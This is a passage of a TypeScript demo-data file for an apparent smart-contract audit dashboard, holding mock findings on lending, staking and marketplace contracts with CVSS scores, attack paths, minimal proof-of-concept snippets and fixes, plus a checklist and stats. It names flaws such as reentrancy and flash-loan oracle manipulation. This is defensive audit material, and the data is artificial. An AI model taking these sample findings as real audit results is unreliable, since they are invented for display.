      beforeCode: `function liquidate(address _user) external {
    require(getAccountHealth(_user) < liquidationThreshold);
    
    uint256 debt = borrows[_user];
    uint256 collateralAmount = collateral[_user];
    
    debtToken.transferFrom(msg.sender, address(this), debt);
    collateralToken.transfer(msg.sender, collateralAmount);
    
    borrows[_user] = 0;
    collateral[_user] = 0;
}`,
      afterCode: `function liquidate(address _user, uint256 _debtAmount) external {
    uint256 health = getAccountHealth(_user);
    require(health < liquidationThreshold, "Not liquidatable");
    
    // Cap liquidation to 50% of debt
    uint256 maxLiquidatable = borrows[_user] / 2;
    uint256 amountToLiquidate = _debtAmount > maxLiquidatable 
        ? maxLiquidatable 
        : _debtAmount;
    
    // Calculate collateral to seize (with liquidation bonus)
    uint256 collateralToSeize = _calculateCollateral(amountToLiquidate, 5); // 5% bonus
    
    borrows[_user] -= amountToLiquidate;
    collateral[_user] -= collateralToSeize;
    
    debtToken.transferFrom(msg.sender, address(this), amountToLiquidate);
    collateralToken.transfer(msg.sender, collateralToSeize);
}`,
      openZeppelinRefs: ['https://docs.aave.com/developers/guides/liquidation-hits'],
      gasImpact: 'Neutral',
      testingRecommendations: ['Test partial liquidation', 'Test liquidation bonus', 'Test max liquidation cap'],
      alternativeMitigations: ['Add liquidation incentive', 'Use Dutch auction for liquidations']
    },
    references: [
      { title: 'Aave Liquidation Mechanism', url: 'https://docs.aave.com/risk/liquidation', type: 'documentation' },
      { title: 'MEV and Liquidations', url: 'https://ethereum.org/en/developers/docs/mev/', type: 'academic' }
    ],
    exploitCode: `// See PoC`,
    fixSuggestion: `// Add partial liquidation with caps`,
    learnMore: 'Proper liquidation mechanics are critical for protocol stability.'
  },

  // ─── LendingPool.sol: Missing events and low severity ───
  {
    id: 'f6',
    severity: 'low',
    title: 'Missing zero-address validation in constructor',
    line: 28,
    endLine: 32,
    functionName: 'constructor',
    description: 'The constructor does not validate that _collateral, _debt, and _oracle addresses are not zero. Deploying with zero addresses will cause all oracle price calls and token transfers to fail silently or revert.',
    technicalExplanation: 'While not exploitable directly, missing zero-address checks can lead to deployment errors and locked funds. If the contract is deployed with a zero address for the oracle, all price-dependent functions will fail. OpenZeppelin recommends always checking for zero addresses in constructors.',
    preconditions: ['Contract deployment'],
    cvss: {
      score: 3.1,
      attackVector: 'local',
      attackComplexity: 'low',
      privilegesRequired: 'high',
      userInteraction: 'none',
      scope: 'unchanged',
      impact: {
        confidentiality: 'none',
        integrity: 'low',
        availability: 'low'
      }
    },
    exploitability: 'theoretical',
    businessImpact: 'indirect-loss',
    status: 'new',
    confidence: 'high',
    attackPath: {
      steps: [
        { step: 1, description: 'Deployer accidentally passes zero address' },
        { step: 2, description: 'Contract becomes non-functional' }
      ],
      prerequisites: ['Deployment with zero address (user error)'],
      expectedOutcome: 'Contract non-functional, funds potentially locked',
      estimatedGasCost: 'N/A',
      realWorldParallel: 'Multiple token deployments with zero address errors'
    },
    poc: {
      language: 'solidity',
      code: `// Deploying with zero address
LendingPool pool = new LendingPool(address(0), debtToken, oracle);
// All collateral operations will fail`,
      setupInstructions: ['Deploy with zero address'],
      expectedOutput: 'Contract deployed but non-functional',
      runCommand: 'forge test --match-contract ConstructorTest -vvv'
    },
    remediation: {
      beforeCode: `constructor(address _collateral, address _debt, address _oracle) {
    collateralToken = IERC20(_collateral);
    debtToken = IERC20(_debt);
    priceOracle = _oracle;
}`,
      afterCode: `constructor(address _collateral, address _debt, address _oracle) {
    require(_collateral != address(0), "Zero collateral");
    require(_debt != address(0), "Zero debt token");
    require(_oracle != address(0), "Zero oracle");
    
    collateralToken = IERC20(_collateral);
    debtToken = IERC20(_debt);
    priceOracle = _oracle;
}`,
      openZeppelinRefs: ['https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable'],
      gasImpact: '+3000 gas at deployment',
      testingRecommendations: ['Test deployment with zero addresses', 'Verify revert messages'],
      alternativeMitigations: []
    },
    references: [
      { title: 'Zero Address Validation', url: 'https://github.com/crytic/slither/wiki/Detector-Documentation#missing-zero-address-validation', type: 'detector' }
    ],
    exploitCode: `// Not an exploitable vulnerability`,
    fixSuggestion: `// Add require(_addr != address(0)) checks`,
    learnMore: 'Zero-address checks are a best practice, not a security fix.'
  },

  // ─── LendingPool.sol: Info ───
  {
    id: 'f7',
    severity: 'info',
    title: 'Using floating pragma version',
    line: 1,
    endLine: 2,
    functionName: undefined,
    description: 'Contract uses ^0.8.20 pragma which allows compilation with any 0.8.x version. For production deployments, use a locked pragma version to ensure consistent compilation.',
    technicalExplanation: 'Different Solidity compiler versions may have different optimizations, bug fixes, or behavior changes. Locking the pragma ensures the contract is always compiled with the same version it was tested with.',
    preconditions: [],
    cvss: {
      score: 0.0,
      attackVector: 'network',
      attackComplexity: 'low',
      privilegesRequired: 'none',
      userInteraction: 'none',
      scope: 'unchanged',
      impact: {
        confidentiality: 'none',
        integrity: 'none',
        availability: 'none'
      }
    },
    exploitability: 'theoretical',
    businessImpact: 'info-leak',
    status: 'new',
    confidence: 'high',
    attackPath: {
      steps: [],
      prerequisites: [],
      expectedOutcome: 'Informational — no direct impact',
      estimatedGasCost: 'N/A',
      realWorldParallel: ''
    },
    poc: {
      language: 'solidity',
      code: `// Floating pragma — informational only
pragma solidity ^0.8.20; // Should be 0.8.20`,
      setupInstructions: [],
      expectedOutput: 'No impact',
      runCommand: 'N/A'
    },
    remediation: {
      beforeCode: `pragma solidity ^0.8.20;`,
      afterCode: `pragma solidity 0.8.20;`,
      openZeppelinRefs: [],
      gasImpact: 'None',
      testingRecommendations: [],
      alternativeMitigations: []
    },
    references: [
      { title: 'Pragma Best Practices', url: 'https://docs.soliditylang.org/en/v0.8.20/cheatsheet.html', type: 'documentation' }
    ],
    exploitCode: `// Informational`,
    fixSuggestion: `// Lock pragma to specific version`,
    learnMore: 'Floating pragmas are informational, not security issues.'
  },

  // ─── StakingVault.sol: Low severity ───
  {
    id: 'f8',
    severity: 'low',
    title: 'Centralization risk: admin-controlled reward rate',
    line: 105,
    endLine: 110,
    functionName: 'setRewardRate',
    description: 'The reward rate can be changed at any time by the owner, potentially affecting staker rewards. While the owner is trusted, this introduces a centralization risk.',
    technicalExplanation: 'The setRewardRate function is protected by Ownable, meaning only the contract owner can change reward rates. This is a common pattern but introduces trust assumptions. Consider time-locking changes or using a governance mechanism.',
    preconditions: ['Contract is owner-controlled (by design)'],
    cvss: {
      score: 2.5,
      attackVector: 'local',
      attackComplexity: 'low',
      privilegesRequired: 'high',
      userInteraction: 'none',
      scope: 'unchanged',
      impact: {
        confidentiality: 'none',
        integrity: 'low',
        availability: 'none'
      }
    },
    exploitability: 'theoretical',
    businessImpact: 'indirect-loss',
    status: 'new',
    confidence: 'medium',
    attackPath: {
      steps: [
        { step: 1, description: 'Owner sets extremely high reward rate' },
        { step: 2, description: 'Early stakers receive disproportionate rewards' }
      ],
      prerequisites: ['Owner must be compromised or malicious'],
      expectedOutcome: 'Reward distribution unfairness',
      estimatedGasCost: 'N/A',
      realWorldParallel: 'Admin key risks in many DeFi protocols'
    },
    poc: {
      language: 'solidity',
      code: `// Owner can change reward rate at any time
vault.setRewardRate(newHighRate);`,
      setupInstructions: [],
      expectedOutput: 'Reward rate changes',
      runCommand: 'N/A'
    },
    remediation: {
      beforeCode: `function setRewardRate(uint256 _newRate) external onlyOwner {
    _updateAllRewards();
    rewardRate = _newRate;
    lastUpdateTime = block.timestamp;
}`,
      afterCode: `// Option 1: Add timelock
function setRewardRate(uint256 _newRate) external onlyOwner {
    require(_newRate <= MAX_REWARD_RATE, "Exceeds max");
    _pendingRewardRate = _newRate;
    _pendingRateChangeTime = block.timestamp;
}

function executeRewardRateChange() external onlyOwner {
    require(block.timestamp >= _pendingRateChangeTime + 2 days, "Timelock");
    _updateAllRewards();
    rewardRate = _pendingRewardRate;
    lastUpdateTime = block.timestamp;
}`,
      openZeppelinRefs: ['https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController'],
      gasImpact: 'Additional gas for timelock',
      testingRecommendations: ['Test timelock delay', 'Test rate cap'],
      alternativeMitigations: ['Use governance voting', 'Immutable reward rate']
    },
    references: [
      { title: 'Timelock Pattern', url: 'https://docs.openzeppelin.com/contracts/4.x/api/governance#TimelockController', type: 'documentation' }
    ],
    exploitCode: `// Not directly exploitable`,
    fixSuggestion: `// Add timelock or use governance`,
    learnMore: 'Centralization risks are design decisions, not bugs.'
  },

  // ─── StakingVault.sol: Info ───
  {
    id: 'f9',
    severity: 'info',
    title: 'Missing NatSpec on public functions',
    line: 38,
    endLine: 42,
    functionName: 'deposit',
    description: 'The deposit function lacks NatSpec documentation. While not a security issue, proper documentation improves code review efficiency and enables automated tool integration.',
    technicalExplanation: 'NatSpec documentation is important for code review, automated documentation generation, and security tooling. Functions that handle user funds should always be well-documented.',
    preconditions: [],
    cvss: {
      score: 0.0,
      attackVector: 'network',
      attackComplexity: 'low',
      privilegesRequired: 'none',
      userInteraction: 'none',
      scope: 'unchanged',
      impact: {
        confidentiality: 'none',
        integrity: 'none',
        availability: 'none'
      }
    },
    exploitability: 'theoretical',
    businessImpact: 'info-leak',
    status: 'new',
    confidence: 'high',
    attackPath: {
      steps: [],
      prerequisites: [],
      expectedOutcome: 'Informational',
      estimatedGasCost: 'N/A',
      realWorldParallel: ''
    },
    poc: {
      language: 'solidity',
      code: `// Missing documentation
function deposit(uint256 _amount) external nonReentrant {
    // Should have @notice, @param, @dev tags
}`,
      setupInstructions: [],
      expectedOutput: 'N/A',
      runCommand: 'N/A'
    },
    remediation: {
      beforeCode: `function deposit(uint256 _amount) external nonReentrant {
    require(_amount > 0, "Amount must be > 0");`,
      afterCode: `/**
 * @notice Deposit tokens into the staking vault
 * @param _amount The amount of staking tokens to deposit
 * @dev Uses safeTransferFrom and updates rewards before deposit
 */
function deposit(uint256 _amount) external nonReentrant {
    require(_amount > 0, "Amount must be > 0");`,
      openZeppelinRefs: [],
      gasImpact: 'None',
      testingRecommendations: [],
      alternativeMitigations: []
    },
    references: [
      { title: 'NatSpec Documentation', url: 'https://docs.soliditylang.org/en/v0.8.20/natspec-format.html', type: 'documentation' }
    ],
    exploitCode: `// Not applicable`,
    fixSuggestion: `// Add NatSpec comments`,
    learnMore: 'Good documentation improves security review quality.'
  }
];

// ═══════════════════════════════════════════════════════════════
// AUDIT CHECKLIST
// ═══════════════════════════════════════════════════════════════

export const DEMO_AUDIT_CHECKLIST: Record<string, AuditCheckItem[]> = {
  'Access Control': [
    { id: 'ac1', category: 'Access Control', description: 'Owner privileges properly restricted', status: 'pass', details: 'Ownable pattern correctly implemented' },
    { id: 'ac2', category: 'Access Control', description: 'Role-based access control present', status: 'warning', details: 'Single owner model — consider multi-sig or role-based' },
    { id: 'ac3', category: 'Access Control', description: 'No unprotected initializer', status: 'pass', details: 'No upgradeable pattern used' },
    { id: 'ac4', category: 'Access Control', description: 'All admin functions have modifiers', status: 'pass', details: 'onlyOwner used consistently' },
  ],
  'Reentrancy': [
    { id: 're1', category: 'Reentrancy', description: 'No reentrancy in withdraw functions', status: 'pass', details: 'ReentrancyGuard used on withdraw' },
    { id: 're2', category: 'Reentrancy', description: 'State updated before external calls', status: 'pass', details: 'Checks-Effects-Interactions pattern followed' },
    { id: 're3', category: 'Reentrancy', description: 'No cross-function reentrancy risk', status: 'fail', details: 'buy() updates state after external call' },
  ],
  'Input Validation': [
    { id: 'iv1', category: 'Input Validation', description: 'Zero address checks on transfers', status: 'pass', details: 'Address zero checks in constructor' },
    { id: 'iv2', category: 'Input Validation', description: 'Array length bounds checked', status: 'pass', details: 'No unbounded arrays' },
    { id: 'iv3', category: 'Input Validation', description: 'Amount validation present', status: 'pass', details: 'require(amount > 0) on deposits' },
  ],
  'Economic Security': [
    { id: 'es1', category: 'Economic Security', description: 'Fee calculations are correct', status: 'pass', details: 'Platform fee properly calculated' },
    { id: 'es2', category: 'Economic Security', description: 'Oracle manipulation resistant', status: 'fail', details: 'Spot price oracle — vulnerable to flash loans' },
    { id: 'es3', category: 'Economic Security', description: 'No flash loan attack vectors', status: 'fail', details: 'flashLoan lacks receiver verification' },
  ],
  'Gas Optimization': [
    { id: 'go1', category: 'Gas Optimization', description: 'No unbounded loops', status: 'pass', details: 'No loops over user data' },
    { id: 'go2', category: 'Gas Optimization', description: 'Storage vs memory used correctly', status: 'pass', details: 'Structs use storage references' },
    { id: 'go3', category: 'Gas Optimization', description: 'Redundant SLOAD operations minimized', status: 'warning', details: 'Could cache totalSupply in local' },
  ],
};

// ═══════════════════════════════════════════════════════════════
// IMMUNEFI READINESS
// ═══════════════════════════════════════════════════════════════

export const DEMO_IMMUNEFI_READINESS: ImmunefiReadiness = {
  status: 'no-go',
  overallScore: 38,
  blockingIssues: [DEMO_FINDINGS[0], DEMO_FINDINGS[1], DEMO_FINDINGS[2]], // Critical findings
  recommendedFixes: [DEMO_FINDINGS[3], DEMO_FINDINGS[4]], // High findings
  estimatedBountyRange: '$20,000 - $50,000 (if fixed)',
  submissionChecklist: {
    criticalRemediated: false,
    highReviewed: false,
    testCoverageAbove80: false,
    noKnownExploits: false,
    documentationComplete: false,
    emergencyPauseExists: false,
  }
};

// ═══════════════════════════════════════════════════════════════
// STATS
// ═══════════════════════════════════════════════════════════════

export const DEMO_STATS = {
  totalContracts: 3,
  totalScans: 48,
  criticalFindings: 3,
  avgScore: 57.0,
  scoreTrend: [
    { month: 'Aug', critical: 8, high: 12, low: 5, info: 3 },
    { month: 'Sep', critical: 5, high: 8, low: 7, info: 2 },
    { month: 'Oct', critical: 12, high: 18, low: 10, info: 5 },
    { month: 'Nov', critical: 2, high: 3, low: 4, info: 1 },
    { month: 'Dec', critical: 0, high: 1, low: 2, info: 0 },
    { month: 'Jan', critical: 3, high: 5, low: 6, info: 2 },
    { month: 'Feb', critical: 1, high: 2, low: 3, info: 1 },
  ],
  scanHistory: [
    { date: '2026-03-15', contract: 'StakingVault.sol', score: 91, findings: { critical: 0, high: 0, low: 1, info: 1 } },
    { date: '2026-03-10', contract: 'LendingPool.sol', score: 52, findings: { critical: 1, high: 2, low: 2, info: 1 } },
    { date: '2026-03-01', contract: 'NFTMarketplace.sol', score: 28, findings: { critical: 2, high: 3, low: 1, info: 0 } },
  ],
};

// ═══════════════════════════════════════════════════════════════
// RISK MATRIX DATA
// ═══════════════════════════════════════════════════════════════

export const RISK_MATRIX_DATA = {
  likelihoodLabels: ['Rare', 'Unlikely', 'Possible', 'Likely'] as const,
  impactLabels: ['Low', 'Medium', 'High', 'Critical'] as const,
  cells: [
    // [likelihood][impact] — findings that match each cell
    [[], [], [], [DEMO_FINDINGS[0], DEMO_FINDINGS[2]]], // Rare
    [[], [], [DEMO_FINDINGS[3]], [DEMO_FINDINGS[1]]], // Unlikely
    [[], [DEMO_FINDINGS[5], DEMO_FINDINGS[7]], [DEMO_FINDINGS[4]], []], // Possible
    [[DEMO_FINDINGS[6], DEMO_FINDINGS[8]], [], [], []], // Likely
  ]
};
